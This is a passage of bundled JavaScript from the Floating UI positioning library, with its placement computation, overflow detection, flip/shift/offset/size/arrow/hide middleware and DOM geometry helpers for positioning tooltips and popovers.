  const sideAxis = getSideAxis(placement);
  const alignmentAxis = getAlignmentAxis(placement);
  const alignLength = getAxisLength(alignmentAxis);
  const side = getSide(placement);
  const isVertical = sideAxis === "y";
  const commonX = reference.x + reference.width / 2 - floating.width / 2;
  const commonY = reference.y + reference.height / 2 - floating.height / 2;
  const commonAlign = reference[alignLength] / 2 - floating[alignLength] / 2;
  let coords;
  switch (side) {
    case "top":
      coords = {
        x: commonX,
        y: reference.y - floating.height
      };
      break;
    case "bottom":
      coords = {
        x: commonX,
        y: reference.y + reference.height
      };
      break;
    case "right":
      coords = {
        x: reference.x + reference.width,
        y: commonY
      };
      break;
    case "left":
      coords = {
        x: reference.x - floating.width,
        y: commonY
      };
      break;
    default:
      coords = {
        x: reference.x,
        y: reference.y
      };
  }
  switch (getAlignment(placement)) {
    case "start":
      coords[alignmentAxis] -= commonAlign * (rtl && isVertical ? -1 : 1);
      break;
    case "end":
      coords[alignmentAxis] += commonAlign * (rtl && isVertical ? -1 : 1);
      break;
  }
  return coords;
}
var computePosition = async (reference, floating, config) => {
  const {
    placement = "bottom",
    strategy = "absolute",
    middleware = [],
    platform: platform2
  } = config;
  const validMiddleware = middleware.filter(Boolean);
  const rtl = await (platform2.isRTL == null ? void 0 : platform2.isRTL(floating));
  let rects = await platform2.getElementRects({
    reference,
    floating,
    strategy
  });
  let {
    x,
    y
  } = computeCoordsFromPlacement(rects, placement, rtl);
  let statefulPlacement = placement;
  let middlewareData = {};
  let resetCount = 0;
  for (let i = 0; i < validMiddleware.length; i++) {
    const {
      name,
      fn
    } = validMiddleware[i];
    const {
      x: nextX,
      y: nextY,
      data,
      reset
    } = await fn({
      x,
      y,
      initialPlacement: placement,
      placement: statefulPlacement,
      strategy,
      middlewareData,
      rects,
      platform: platform2,
      elements: {
        reference,
        floating
      }
    });
    x = nextX != null ? nextX : x;
    y = nextY != null ? nextY : y;
    middlewareData = {
      ...middlewareData,
      [name]: {
        ...middlewareData[name],
        ...data
      }
    };
    if (reset && resetCount <= 50) {
      resetCount++;
      if (typeof reset === "object") {
        if (reset.placement) {
          statefulPlacement = reset.placement;
        }
        if (reset.rects) {
          rects = reset.rects === true ? await platform2.getElementRects({
            reference,
            floating,
            strategy
          }) : reset.rects;
        }
        ({
          x,
          y
        } = computeCoordsFromPlacement(rects, statefulPlacement, rtl));
      }
      i = -1;
    }
  }
  return {
    x,
    y,
    placement: statefulPlacement,
    strategy,
    middlewareData
  };
};
async function detectOverflow(state, options) {
  var _await$platform$isEle;
  if (options === void 0) {
    options = {};
  }
  const {
    x,
    y,
    platform: platform2,
    rects,
    elements,
    strategy
  } = state;
  const {
    boundary = "clippingAncestors",
    rootBoundary = "viewport",
    elementContext = "floating",
    altBoundary = false,
    padding = 0
  } = evaluate(options, state);
  const paddingObject = getPaddingObject(padding);
  const altContext = elementContext === "floating" ? "reference" : "floating";
  const element = elements[altBoundary ? altContext : elementContext];
  const clippingClientRect = rectToClientRect(await platform2.getClippingRect({
    element: ((_await$platform$isEle = await (platform2.isElement == null ? void 0 : platform2.isElement(element))) != null ? _await$platform$isEle : true) ? element : element.contextElement || await (platform2.getDocumentElement == null ? void 0 : platform2.getDocumentElement(elements.floating)),
    boundary,
    rootBoundary,
    strategy
  }));
  const rect = elementContext === "floating" ? {
    x,
    y,
    width: rects.floating.width,
    height: rects.floating.height
  } : rects.reference;
  const offsetParent = await (platform2.getOffsetParent == null ? void 0 : platform2.getOffsetParent(elements.floating));
  const offsetScale = await (platform2.isElement == null ? void 0 : platform2.isElement(offsetParent)) ? await (platform2.getScale == null ? void 0 : platform2.getScale(offsetParent)) || {
    x: 1,
    y: 1
  } : {
    x: 1,
    y: 1
  };
  const elementClientRect = rectToClientRect(platform2.convertOffsetParentRelativeRectToViewportRelativeRect ? await platform2.convertOffsetParentRelativeRectToViewportRelativeRect({
    elements,
    rect,
    offsetParent,
    strategy
  }) : rect);
  return {
    top: (clippingClientRect.top - elementClientRect.top + paddingObject.top) / offsetScale.y,
    bottom: (elementClientRect.bottom - clippingClientRect.bottom + paddingObject.bottom) / offsetScale.y,
    left: (clippingClientRect.left - elementClientRect.left + paddingObject.left) / offsetScale.x,
    right: (elementClientRect.right - clippingClientRect.right + paddingObject.right) / offsetScale.x
  };
}
var arrow = (options) => ({
  name: "arrow",
  options,
  async fn(state) {
    const {
      x,
      y,
      placement,
      rects,
      platform: platform2,
      elements,
      middlewareData
    } = state;
    const {
      element,
      padding = 0
    } = evaluate(options, state) || {};
    if (element == null) {
      return {};
    }
    const paddingObject = getPaddingObject(padding);
    const coords = {
      x,
      y
    };
    const axis = getAlignmentAxis(placement);
    const length = getAxisLength(axis);
    const arrowDimensions = await platform2.getDimensions(element);
    const isYAxis = axis === "y";
    const minProp = isYAxis ? "top" : "left";
    const maxProp = isYAxis ? "bottom" : "right";
    const clientProp = isYAxis ? "clientHeight" : "clientWidth";
    const endDiff = rects.reference[length] + rects.reference[axis] - coords[axis] - rects.floating[length];
    const startDiff = coords[axis] - rects.reference[axis];
    const arrowOffsetParent = await (platform2.getOffsetParent == null ? void 0 : platform2.getOffsetParent(element));
    let clientSize = arrowOffsetParent ? arrowOffsetParent[clientProp] : 0;
    if (!clientSize || !await (platform2.isElement == null ? void 0 : platform2.isElement(arrowOffsetParent))) {
      clientSize = elements.floating[clientProp] || rects.floating[length];
    }
    const centerToReference = endDiff / 2 - startDiff / 2;
    const largestPossiblePadding = clientSize / 2 - arrowDimensions[length] / 2 - 1;
    const minPadding = min(paddingObject[minProp], largestPossiblePadding);
    const maxPadding = min(paddingObject[maxProp], largestPossiblePadding);
    const min$1 = minPadding;
    const max3 = clientSize - arrowDimensions[length] - maxPadding;
    const center = clientSize / 2 - arrowDimensions[length] / 2 + centerToReference;
    const offset4 = clamp(min$1, center, max3);
    const shouldAddOffset = !middlewareData.arrow && getAlignment(placement) != null && center !== offset4 && rects.reference[length] / 2 - (center < min$1 ? minPadding : maxPadding) - arrowDimensions[length] / 2 < 0;
    const alignmentOffset = shouldAddOffset ? center < min$1 ? center - min$1 : center - max3 : 0;
    return {
      [axis]: coords[axis] + alignmentOffset,
      data: {
        [axis]: offset4,
        centerOffset: center - offset4 - alignmentOffset,
        ...shouldAddOffset && {
          alignmentOffset
        }
      },
      reset: shouldAddOffset
    };
  }
});
var flip = function(options) {
  if (options === void 0) {
    options = {};
  }
  return {
    name: "flip",
    options,
    async fn(state) {
      var _middlewareData$arrow, _middlewareData$flip;
      const {
        placement,
        middlewareData,
        rects,
        initialPlacement,
        platform: platform2,
        elements
      } = state;
      const {
        mainAxis: checkMainAxis = true,
        crossAxis: checkCrossAxis = true,
        fallbackPlacements: specifiedFallbackPlacements,
        fallbackStrategy = "bestFit",
        fallbackAxisSideDirection = "none",
        flipAlignment = true,
        ...detectOverflowOptions
      } = evaluate(options, state);
      if ((_middlewareData$arrow = middlewareData.arrow) != null && _middlewareData$arrow.alignmentOffset) {
        return {};
      }
      const side = getSide(placement);
      const initialSideAxis = getSideAxis(initialPlacement);
      const isBasePlacement = getSide(initialPlacement) === initialPlacement;
      const rtl = await (platform2.isRTL == null ? void 0 : platform2.isRTL(elements.floating));
      const fallbackPlacements = specifiedFallbackPlacements || (isBasePlacement || !flipAlignment ? [getOppositePlacement(initialPlacement)] : getExpandedPlacements(initialPlacement));
      const hasFallbackAxisSideDirection = fallbackAxisSideDirection !== "none";
      if (!specifiedFallbackPlacements && hasFallbackAxisSideDirection) {
        fallbackPlacements.push(...getOppositeAxisPlacements(initialPlacement, flipAlignment, fallbackAxisSideDirection, rtl));
      }
      const placements2 = [initialPlacement, ...fallbackPlacements];
      const overflow = await detectOverflow(state, detectOverflowOptions);
      const overflows = [];
      let overflowsData = ((_middlewareData$flip = middlewareData.flip) == null ? void 0 : _middlewareData$flip.overflows) || [];
      if (checkMainAxis) {
        overflows.push(overflow[side]);
      }
      if (checkCrossAxis) {
        const sides2 = getAlignmentSides(placement, rects, rtl);
        overflows.push(overflow[sides2[0]], overflow[sides2[1]]);
      }
      overflowsData = [...overflowsData, {
        placement,
        overflows
      }];
      if (!overflows.every((side2) => side2 <= 0)) {
        var _middlewareData$flip2, _overflowsData$filter;
        const nextIndex = (((_middlewareData$flip2 = middlewareData.flip) == null ? void 0 : _middlewareData$flip2.index) || 0) + 1;
        const nextPlacement = placements2[nextIndex];
        if (nextPlacement) {
          const ignoreCrossAxisOverflow = checkCrossAxis === "alignment" ? initialSideAxis !== getSideAxis(nextPlacement) : false;
          if (!ignoreCrossAxisOverflow || // We leave the current main axis only if every placement on that axis
          // overflows the main axis.
          overflowsData.every((d) => d.overflows[0] > 0 && getSideAxis(d.placement) === initialSideAxis)) {
            return {
              data: {
                index: nextIndex,
                overflows: overflowsData
              },
              reset: {
                placement: nextPlacement
              }
            };
          }
        }
        let resetPlacement = (_overflowsData$filter = overflowsData.filter((d) => d.overflows[0] <= 0).sort((a, b) => a.overflows[1] - b.overflows[1])[0]) == null ? void 0 : _overflowsData$filter.placement;
        if (!resetPlacement) {
          switch (fallbackStrategy) {
            case "bestFit": {
              var _overflowsData$filter2;
              const placement2 = (_overflowsData$filter2 = overflowsData.filter((d) => {
                if (hasFallbackAxisSideDirection) {
                  const currentSideAxis = getSideAxis(d.placement);
                  return currentSideAxis === initialSideAxis || // Create a bias to the `y` side axis due to horizontal
                  // reading directions favoring greater width.
                  currentSideAxis === "y";
                }
                return true;
              }).map((d) => [d.placement, d.overflows.filter((overflow2) => overflow2 > 0).reduce((acc, overflow2) => acc + overflow2, 0)]).sort((a, b) => a[1] - b[1])[0]) == null ? void 0 : _overflowsData$filter2[0];
              if (placement2) {
                resetPlacement = placement2;
              }
              break;
            }
            case "initialPlacement":
              resetPlacement = initialPlacement;
              break;
          }
        }
        if (placement !== resetPlacement) {
          return {
            reset: {
              placement: resetPlacement
            }
          };
        }
      }
      return {};
    }
  };
};
function getSideOffsets(overflow, rect) {
  return {
    top: overflow.top - rect.height,
    right: overflow.right - rect.width,
    bottom: overflow.bottom - rect.height,
    left: overflow.left - rect.width
  };
}
function isAnySideFullyClipped(overflow) {
  return sides.some((side) => overflow[side] >= 0);
}
var hide = function(options) {
  if (options === void 0) {
    options = {};
  }
  return {
    name: "hide",
    options,
    async fn(state) {
      const {
        rects
      } = state;
      const {
        strategy = "referenceHidden",
        ...detectOverflowOptions
      } = evaluate(options, state);
      switch (strategy) {
        case "referenceHidden": {
          const overflow = await detectOverflow(state, {
            ...detectOverflowOptions,
            elementContext: "reference"
          });
          const offsets = getSideOffsets(overflow, rects.reference);
          return {
            data: {
              referenceHiddenOffsets: offsets,
              referenceHidden: isAnySideFullyClipped(offsets)
            }
          };
        }
        case "escaped": {
          const overflow = await detectOverflow(state, {
            ...detectOverflowOptions,
            altBoundary: true
          });
          const offsets = getSideOffsets(overflow, rects.floating);
          return {
            data: {
              escapedOffsets: offsets,
              escaped: isAnySideFullyClipped(offsets)
            }
          };
        }
        default: {
          return {};
        }
      }
    }
  };
};
var originSides = /* @__PURE__ */ new Set(["left", "top"]);
async function convertValueToCoords(state, options) {
  const {
    placement,
    platform: platform2,
    elements
  } = state;
  const rtl = await (platform2.isRTL == null ? void 0 : platform2.isRTL(elements.floating));
  const side = getSide(placement);
  const alignment = getAlignment(placement);
  const isVertical = getSideAxis(placement) === "y";
  const mainAxisMulti = originSides.has(side) ? -1 : 1;
  const crossAxisMulti = rtl && isVertical ? -1 : 1;
  const rawValue = evaluate(options, state);
  let {
    mainAxis,
    crossAxis,
    alignmentAxis
  } = typeof rawValue === "number" ? {
    mainAxis: rawValue,
    crossAxis: 0,
    alignmentAxis: null
  } : {
    mainAxis: rawValue.mainAxis || 0,
    crossAxis: rawValue.crossAxis || 0,
    alignmentAxis: rawValue.alignmentAxis
  };
  if (alignment && typeof alignmentAxis === "number") {
    crossAxis = alignment === "end" ? alignmentAxis * -1 : alignmentAxis;
  }
  return isVertical ? {
    x: crossAxis * crossAxisMulti,
    y: mainAxis * mainAxisMulti
  } : {
    x: mainAxis * mainAxisMulti,
    y: crossAxis * crossAxisMulti
  };
}
var offset = function(options) {
  if (options === void 0) {
    options = 0;
  }
  return {
    name: "offset",
    options,
    async fn(state) {
      var _middlewareData$offse, _middlewareData$arrow;
      const {
        x,
        y,
        placement,
        middlewareData
      } = state;
      const diffCoords = await convertValueToCoords(state, options);
      if (placement === ((_middlewareData$offse = middlewareData.offset) == null ? void 0 : _middlewareData$offse.placement) && (_middlewareData$arrow = middlewareData.arrow) != null && _middlewareData$arrow.alignmentOffset) {
        return {};
      }
      return {
        x: x + diffCoords.x,
        y: y + diffCoords.y,
        data: {
          ...diffCoords,
          placement
        }
      };
    }
  };
};
var shift = function(options) {
  if (options === void 0) {
    options = {};
  }
  return {
    name: "shift",
    options,
    async fn(state) {
      const {
        x,
        y,
        placement
      } = state;
      const {
        mainAxis: checkMainAxis = true,
        crossAxis: checkCrossAxis = false,
        limiter = {
          fn: (_ref) => {
            let {
              x: x2,
              y: y2
            } = _ref;
            return {
              x: x2,
              y: y2
            };
          }
        },
        ...detectOverflowOptions
      } = evaluate(options, state);
      const coords = {
        x,
        y
      };
      const overflow = await detectOverflow(state, detectOverflowOptions);
      const crossAxis = getSideAxis(getSide(placement));
      const mainAxis = getOppositeAxis(crossAxis);
      let mainAxisCoord = coords[mainAxis];
      let crossAxisCoord = coords[crossAxis];
      if (checkMainAxis) {
        const minSide = mainAxis === "y" ? "top" : "left";
        const maxSide = mainAxis === "y" ? "bottom" : "right";
        const min3 = mainAxisCoord + overflow[minSide];
        const max3 = mainAxisCoord - overflow[maxSide];
        mainAxisCoord = clamp(min3, mainAxisCoord, max3);
      }
      if (checkCrossAxis) {
        const minSide = crossAxis === "y" ? "top" : "left";
        const maxSide = crossAxis === "y" ? "bottom" : "right";
        const min3 = crossAxisCoord + overflow[minSide];
        const max3 = crossAxisCoord - overflow[maxSide];
        crossAxisCoord = clamp(min3, crossAxisCoord, max3);
      }
      const limitedCoords = limiter.fn({
        ...state,
        [mainAxis]: mainAxisCoord,
        [crossAxis]: crossAxisCoord
      });
      return {
        ...limitedCoords,
        data: {
          x: limitedCoords.x - x,
          y: limitedCoords.y - y,
          enabled: {
            [mainAxis]: checkMainAxis,
            [crossAxis]: checkCrossAxis
          }
        }
      };
    }
  };
};
var limitShift = function(options) {
  if (options === void 0) {
    options = {};
  }
  return {
    options,
    fn(state) {
      const {
        x,
        y,
        placement,
        rects,
        middlewareData
      } = state;
      const {
        offset: offset4 = 0,
        mainAxis: checkMainAxis = true,
        crossAxis: checkCrossAxis = true
      } = evaluate(options, state);
      const coords = {
        x,
        y
      };
      const crossAxis = getSideAxis(placement);
      const mainAxis = getOppositeAxis(crossAxis);
      let mainAxisCoord = coords[mainAxis];
      let crossAxisCoord = coords[crossAxis];
      const rawOffset = evaluate(offset4, state);
      const computedOffset = typeof rawOffset === "number" ? {
        mainAxis: rawOffset,
        crossAxis: 0
      } : {
        mainAxis: 0,
        crossAxis: 0,
        ...rawOffset
      };
      if (checkMainAxis) {
        const len = mainAxis === "y" ? "height" : "width";
        const limitMin = rects.reference[mainAxis] - rects.floating[len] + computedOffset.mainAxis;
        const limitMax = rects.reference[mainAxis] + rects.reference[len] - computedOffset.mainAxis;
        if (mainAxisCoord < limitMin) {
          mainAxisCoord = limitMin;
        } else if (mainAxisCoord > limitMax) {
          mainAxisCoord = limitMax;
        }
      }
      if (checkCrossAxis) {
        var _middlewareData$offse, _middlewareData$offse2;
        const len = mainAxis === "y" ? "width" : "height";
        const isOriginSide = originSides.has(getSide(placement));
        const limitMin = rects.reference[crossAxis] - rects.floating[len] + (isOriginSide ? ((_middlewareData$offse = middlewareData.offset) == null ? void 0 : _middlewareData$offse[crossAxis]) || 0 : 0) + (isOriginSide ? 0 : computedOffset.crossAxis);
        const limitMax = rects.reference[crossAxis] + rects.reference[len] + (isOriginSide ? 0 : ((_middlewareData$offse2 = middlewareData.offset) == null ? void 0 : _middlewareData$offse2[crossAxis]) || 0) - (isOriginSide ? computedOffset.crossAxis : 0);
        if (crossAxisCoord < limitMin) {
          crossAxisCoord = limitMin;
        } else if (crossAxisCoord > limitMax) {
          crossAxisCoord = limitMax;
        }
      }
      return {
        [mainAxis]: mainAxisCoord,
        [crossAxis]: crossAxisCoord
      };
    }
  };
};
var size = function(options) {
  if (options === void 0) {
    options = {};
  }
  return {
    name: "size",
    options,
    async fn(state) {
      var _state$middlewareData, _state$middlewareData2;
      const {
        placement,
        rects,
        platform: platform2,
        elements
      } = state;
      const {
        apply = () => {
        },
        ...detectOverflowOptions
      } = evaluate(options, state);
      const overflow = await detectOverflow(state, detectOverflowOptions);
      const side = getSide(placement);
      const alignment = getAlignment(placement);
      const isYAxis = getSideAxis(placement) === "y";
      const {
        width,
        height
      } = rects.floating;
      let heightSide;
      let widthSide;
      if (side === "top" || side === "bottom") {
        heightSide = side;
        widthSide = alignment === (await (platform2.isRTL == null ? void 0 : platform2.isRTL(elements.floating)) ? "start" : "end") ? "left" : "right";
      } else {
        widthSide = side;
        heightSide = alignment === "end" ? "top" : "bottom";
      }
      const maximumClippingHeight = height - overflow.top - overflow.bottom;
      const maximumClippingWidth = width - overflow.left - overflow.right;
      const overflowAvailableHeight = min(height - overflow[heightSide], maximumClippingHeight);
      const overflowAvailableWidth = min(width - overflow[widthSide], maximumClippingWidth);
      const noShift = !state.middlewareData.shift;
      let availableHeight = overflowAvailableHeight;
      let availableWidth = overflowAvailableWidth;
      if ((_state$middlewareData = state.middlewareData.shift) != null && _state$middlewareData.enabled.x) {
        availableWidth = maximumClippingWidth;
      }
      if ((_state$middlewareData2 = state.middlewareData.shift) != null && _state$middlewareData2.enabled.y) {
        availableHeight = maximumClippingHeight;
      }
      if (noShift && !alignment) {
        const xMin = max(overflow.left, 0);
        const xMax = max(overflow.right, 0);
        const yMin = max(overflow.top, 0);
        const yMax = max(overflow.bottom, 0);
        if (isYAxis) {
          availableWidth = width - 2 * (xMin !== 0 || xMax !== 0 ? xMin + xMax : max(overflow.left, overflow.right));
        } else {
          availableHeight = height - 2 * (yMin !== 0 || yMax !== 0 ? yMin + yMax : max(overflow.top, overflow.bottom));
        }
      }
      await apply({
        ...state,
        availableWidth,
        availableHeight
      });
      const nextDimensions = await platform2.getDimensions(elements.floating);
      if (width !== nextDimensions.width || height !== nextDimensions.height) {
        return {
          reset: {
            rects: true
          }
        };
      }
      return {};
    }
  };
};

// node_modules/@floating-ui/utils/dist/floating-ui.utils.dom.mjs
function hasWindow() {
  return typeof window !== "undefined";
}
function getNodeName(node) {
  if (isNode(node)) {
    return (node.nodeName || "").toLowerCase();
  }
  return "#document";
}
function getWindow(node) {
  var _node$ownerDocument;
  return (node == null || (_node$ownerDocument = node.ownerDocument) == null ? void 0 : _node$ownerDocument.defaultView) || window;
}
function getDocumentElement(node) {
  var _ref;
  return (_ref = (isNode(node) ? node.ownerDocument : node.document) || window.document) == null ? void 0 : _ref.documentElement;
}
function isNode(value) {
  if (!hasWindow()) {
    return false;
  }
  return value instanceof Node || value instanceof getWindow(value).Node;
}
function isElement(value) {
  if (!hasWindow()) {
    return false;
  }
  return value instanceof Element || value instanceof getWindow(value).Element;
}
function isHTMLElement2(value) {
  if (!hasWindow()) {
    return false;
  }
  return value instanceof HTMLElement || value instanceof getWindow(value).HTMLElement;
}
function isShadowRoot(value) {
  if (!hasWindow() || typeof ShadowRoot === "undefined") {
    return false;
  }
  return value instanceof ShadowRoot || value instanceof getWindow(value).ShadowRoot;
}
var invalidOverflowDisplayValues = /* @__PURE__ */ new Set(["inline", "contents"]);
function isOverflowElement(element) {
  const {
    overflow,
    overflowX,
    overflowY,
    display
  } = getComputedStyle2(element);
  return /auto|scroll|overlay|hidden|clip/.test(overflow + overflowY + overflowX) && !invalidOverflowDisplayValues.has(display);
}
var tableElements = /* @__PURE__ */ new Set(["table", "td", "th"]);
function isTableElement(element) {
  return tableElements.has(getNodeName(element));
}
var topLayerSelectors = [":popover-open", ":modal"];
function isTopLayer(element) {
  return topLayerSelectors.some((selector) => {
    try {
      return element.matches(selector);
    } catch (_e) {
      return false;
    }
  });
}
var transformProperties = ["transform", "translate", "scale", "rotate", "perspective"];
var willChangeValues = ["transform", "translate", "scale", "rotate", "perspective", "filter"];
var containValues = ["paint", "layout", "strict", "content"];
function isContainingBlock(elementOrCss) {
  const webkit = isWebKit();
  const css = isElement(elementOrCss) ? getComputedStyle2(elementOrCss) : elementOrCss;
  return transformProperties.some((value) => css[value] ? css[value] !== "none" : false) || (css.containerType ? css.containerType !== "normal" : false) || !webkit && (css.backdropFilter ? css.backdropFilter !== "none" : false) || !webkit && (css.filter ? css.filter !== "none" : false) || willChangeValues.some((value) => (css.willChange || "").includes(value)) || containValues.some((value) => (css.contain || "").includes(value));
}
function getContainingBlock(element) {
  let currentNode = getParentNode(element);
  while (isHTMLElement2(currentNode) && !isLastTraversableNode(currentNode)) {
    if (isContainingBlock(currentNode)) {
      return currentNode;
    } else if (isTopLayer(currentNode)) {
      return null;
    }
    currentNode = getParentNode(currentNode);
  }
  return null;
}
function isWebKit() {
  if (typeof CSS === "undefined" || !CSS.supports) return false;
  return CSS.supports("-webkit-backdrop-filter", "none");
}
var lastTraversableNodeNames = /* @__PURE__ */ new Set(["html", "body", "#document"]);
function isLastTraversableNode(node) {
  return lastTraversableNodeNames.has(getNodeName(node));
}
function getComputedStyle2(element) {
  return getWindow(element).getComputedStyle(element);
}
function getNodeScroll(element) {
  if (isElement(element)) {
    return {
      scrollLeft: element.scrollLeft,
      scrollTop: element.scrollTop
    };
  }
  return {
    scrollLeft: element.scrollX,
    scrollTop: element.scrollY
  };
}
function getParentNode(node) {
  if (getNodeName(node) === "html") {
    return node;
  }
  const result = (
    // Step into the shadow DOM of the parent of a slotted node.
    node.assignedSlot || // DOM Element detected.
    node.parentNode || // ShadowRoot detected.
    isShadowRoot(node) && node.host || // Fallback.
    getDocumentElement(node)
  );
  return isShadowRoot(result) ? result.host : result;
}
function getNearestOverflowAncestor(node) {
  const parentNode = getParentNode(node);
  if (isLastTraversableNode(parentNode)) {
    return node.ownerDocument ? node.ownerDocument.body : node.body;
  }
  if (isHTMLElement2(parentNode) && isOverflowElement(parentNode)) {
    return parentNode;
  }
  return getNearestOverflowAncestor(parentNode);
}
function getOverflowAncestors(node, list, traverseIframes) {
  var _node$ownerDocument2;
  if (list === void 0) {
    list = [];
  }
  if (traverseIframes === void 0) {
    traverseIframes = true;
  }
  const scrollableAncestor = getNearestOverflowAncestor(node);
  const isBody = scrollableAncestor === ((_node$ownerDocument2 = node.ownerDocument) == null ? void 0 : _node$ownerDocument2.body);
  const win = getWindow(scrollableAncestor);
  if (isBody) {
    const frameElement = getFrameElement(win);
    return list.concat(win, win.visualViewport || [], isOverflowElement(scrollableAncestor) ? scrollableAncestor : [], frameElement && traverseIframes ? getOverflowAncestors(frameElement) : []);
  }
  return list.concat(scrollableAncestor, getOverflowAncestors(scrollableAncestor, [], traverseIframes));
}
function getFrameElement(win) {
  return win.parent && Object.getPrototypeOf(win.parent) ? win.frameElement : null;
}

// node_modules/@floating-ui/dom/dist/floating-ui.dom.mjs
function getCssDimensions(element) {
  const css = getComputedStyle2(element);
  let width = parseFloat(css.width) || 0;
  let height = parseFloat(css.height) || 0;
  const hasOffset = isHTMLElement2(element);
  const offsetWidth = hasOffset ? element.offsetWidth : width;
  const offsetHeight = hasOffset ? element.offsetHeight : height;
  const shouldFallback = round(width) !== offsetWidth || round(height) !== offsetHeight;
  if (shouldFallback) {
    width = offsetWidth;
    height = offsetHeight;
  }
  return {
    width,
    height,
    $: shouldFallback
  };
}
function unwrapElement(element) {
  return !isElement(element) ? element.contextElement : element;
}
function getScale(element) {
  const domElement = unwrapElement(element);
  if (!isHTMLElement2(domElement)) {
    return createCoords(1);
  }
  const rect = domElement.getBoundingClientRect();
  const {
    width,
    height,
    $
  } = getCssDimensions(domElement);
  let x = ($ ? round(rect.width) : rect.width) / width;
  let y = ($ ? round(rect.height) : rect.height) / height;
  if (!x || !Number.isFinite(x)) {
    x = 1;
  }
  if (!y || !Number.isFinite(y)) {
    y = 1;
  }
  return {
    x,
    y
  };
}
var noOffsets = /* @__PURE__ */ createCoords(0);
function getVisualOffsets(element) {
  const win = getWindow(element);
  if (!isWebKit() || !win.visualViewport) {
    return noOffsets;
  }
  return {
    x: win.visualViewport.offsetLeft,
    y: win.visualViewport.offsetTop
  };
}
function shouldAddVisualOffsets(element, isFixed, floatingOffsetParent) {
  if (isFixed === void 0) {
    isFixed = false;
  }
  if (!floatingOffsetParent || isFixed && floatingOffsetParent !== getWindow(element)) {
    return false;
  }
  return isFixed;
}
function getBoundingClientRect(element, includeScale, isFixedStrategy, offsetParent) {
  if (includeScale === void 0) {
    includeScale = false;
  }
  if (isFixedStrategy === void 0) {
    isFixedStrategy = false;
  }
  const clientRect = element.getBoundingClientRect();
  const domElement = unwrapElement(element);
  let scale = createCoords(1);
  if (includeScale) {
    if (offsetParent) {
      if (isElement(offsetParent)) {
        scale = getScale(offsetParent);
      }
    } else {
      scale = getScale(element);
    }
  }
  const visualOffsets = shouldAddVisualOffsets(domElement, isFixedStrategy, offsetParent) ? getVisualOffsets(domElement) : createCoords(0);
  let x = (clientRect.left + visualOffsets.x) / scale.x;
  let y = (clientRect.top + visualOffsets.y) / scale.y;
  let width = clientRect.width / scale.x;
  let height = clientRect.height / scale.y;
  if (domElement) {
    const win = getWindow(domElement);
    const offsetWin = offsetParent && isElement(offsetParent) ? getWindow(offsetParent) : offsetParent;
    let currentWin = win;
    let currentIFrame = getFrameElement(currentWin);
    while (currentIFrame && offsetParent && offsetWin !== currentWin) {
      const iframeScale = getScale(currentIFrame);
      const iframeRect = currentIFrame.getBoundingClientRect();
      const css = getComputedStyle2(currentIFrame);
      const left = iframeRect.left + (currentIFrame.clientLeft + parseFloat(css.paddingLeft)) * iframeScale.x;
      const top = iframeRect.top + (currentIFrame.clientTop + parseFloat(css.paddingTop)) * iframeScale.y;
      x *= iframeScale.x;
      y *= iframeScale.y;
      width *= iframeScale.x;
      height *= iframeScale.y;
      x += left;
      y += top;
      currentWin = getWindow(currentIFrame);
      currentIFrame = getFrameElement(currentWin);
    }
  }
  return rectToClientRect({
    width,
    height,
    x,
    y
  });
}
function getWindowScrollBarX(element, rect) {
  const leftScroll = getNodeScroll(element).scrollLeft;
  if (!rect) {
    return getBoundingClientRect(getDocumentElement(element)).left + leftScroll;
  }
  return rect.left + leftScroll;
}
function getHTMLOffset(documentElement, scroll, ignoreScrollbarX) {
  if (ignoreScrollbarX === void 0) {
    ignoreScrollbarX = false;
  }
  const htmlRect = documentElement.getBoundingClientRect();
  const x = htmlRect.left + scroll.scrollLeft - (ignoreScrollbarX ? 0 : (
    // RTL <body> scrollbar.
    getWindowScrollBarX(documentElement, htmlRect)
  ));
  const y = htmlRect.top + scroll.scrollTop;
  return {
    x,
    y
  };
}
function convertOffsetParentRelativeRectToViewportRelativeRect(_ref) {
  let {
    elements,
    rect,
    offsetParent,
    strategy
  } = _ref;
  const isFixed = strategy === "fixed";
  const documentElement = getDocumentElement(offsetParent);
  const topLayer = elements ? isTopLayer(elements.floating) : false;
  if (offsetParent === documentElement || topLayer && isFixed) {
    return rect;
  }
  let scroll = {
    scrollLeft: 0,
    scrollTop: 0
  };
  let scale = createCoords(1);
  const offsets = createCoords(0);
  const isOffsetParentAnElement = isHTMLElement2(offsetParent);
  if (isOffsetParentAnElement || !isOffsetParentAnElement && !isFixed) {
    if (getNodeName(offsetParent) !== "body" || isOverflowElement(documentElement)) {
      scroll = getNodeScroll(offsetParent);
    }
    if (isHTMLElement2(offsetParent)) {
      const offsetRect = getBoundingClientRect(offsetParent);
      scale = getScale(offsetParent);
      offsets.x = offsetRect.x + offsetParent.clientLeft;
      offsets.y = offsetRect.y + offsetParent.clientTop;
    }
  }
  const htmlOffset = documentElement && !isOffsetParentAnElement && !isFixed ? getHTMLOffset(documentElement, scroll, true) : createCoords(0);
  return {
    width: rect.width * scale.x,
    height: rect.height * scale.y,
    x: rect.x * scale.x - scroll.scrollLeft * scale.x + offsets.x + htmlOffset.x,
    y: rect.y * scale.y - scroll.scrollTop * scale.y + offsets.y + htmlOffset.y
  };
}
function getClientRects(element) {
  return Array.from(element.getClientRects());
}
function getDocumentRect(element) {
  const html = getDocumentElement(element);
  const scroll = getNodeScroll(element);
  const body = element.ownerDocument.body;
  const width = max(html.scrollWidth, html.clientWidth, body.scrollWidth, body.clientWidth);
  const height = max(html.scrollHeight, html.clientHeight, body.scrollHeight, body.clientHeight);
  let x = -scroll.scrollLeft + getWindowScrollBarX(element);
  const y = -scroll.scrollTop;
  if (getComputedStyle2(body).direction === "rtl") {
    x += max(html.clientWidth, body.clientWidth) - width;
  }
  return {
    width,
    height,
    x,
    y
  };
}
function getViewportRect(element, strategy) {
  const win = getWindow(element);
  const html = getDocumentElement(element);
  const visualViewport = win.visualViewport;
  let width = html.clientWidth;
  let height = html.clientHeight;
  let x = 0;
  let y = 0;
  if (visualViewport) {
    width = visualViewport.width;
    height = visualViewport.height;
    const visualViewportBased = isWebKit();
    if (!visualViewportBased || visualViewportBased && strategy === "fixed") {
      x = visualViewport.offsetLeft;
      y = visualViewport.offsetTop;
    }
  }
  return {
    width,
    height,
    x,
    y
  };
}
var absoluteOrFixed = /* @__PURE__ */ new Set(["absolute", "fixed"]);
function getInnerBoundingClientRect(element, strategy) {
  const clientRect = getBoundingClientRect(element, true, strategy === "fixed");
  const top = clientRect.top + element.clientTop;
  const left = clientRect.left + element.clientLeft;
  const scale = isHTMLElement2(element) ? getScale(element) : createCoords(1);
  const width = element.clientWidth * scale.x;
  const height = element.clientHeight * scale.y;
  const x = left * scale.x;
